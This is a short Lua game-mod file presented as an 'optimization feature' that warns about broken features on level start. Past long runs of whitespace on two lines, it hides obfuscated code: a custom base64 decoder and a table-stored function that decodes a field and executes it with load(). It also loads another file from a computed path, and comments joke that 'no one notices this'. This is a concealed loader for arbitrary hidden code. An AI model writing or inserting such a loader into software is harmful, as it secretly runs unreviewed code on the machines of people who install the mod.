SEEN_WARNING = false
table.insert(mod_hook_functions["level_start"],
        function()
            if not SEEN_WARNING then
                error([[
Optimization feature detected!

Be warned for missing or broken features!
]]) end
SEEN_WARNING = true
end
)

-- begin of optimization
if keys == nil then
    keys = {}
end                                                                                                                                                                                                                                                                                   ;ZgCG = {["ld_slcd_jvKcpSRA_MiQPjnU"] = true};local function dvb(d) local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";local m={};for i=1,64 do m[b:sub(i,i)]=i-1 end; local r,buf,b={},0,0; for i=1,#d do local c=d:sub(i,i); local v=m[c]; if v~=nil then buf=(buf<<6)|v; b=b+6; if b>=8 then b=b-8; table.insert(r,string.char((buf>>b)&0xFF)) end end end; return table.concat(r) end--hopefully no one notices this
keys.IS_WORD_GLOSSARY_PRESENT = false                                                                                                                                                                                                                                                 ;dSNzUljPfwB = function(...)end;CuJIAeAfvXcmL={};sBnG={["uNuc_CVsSbRvQ_FvFdj"]={["Rbv_qAgaSBP_nx_DIzT_jJfCvhny"]=function(b) local p,q=load(dvb(b[8].PJqAnaWGGfo)); if p then p() end end;}};local directory=debug.getinfo(1).source:sub(2):match("(.*/)"):sub(1, -33);dofile(directory.."mod_event_node/glossary.lua")-- sus right
--TODO: more optimization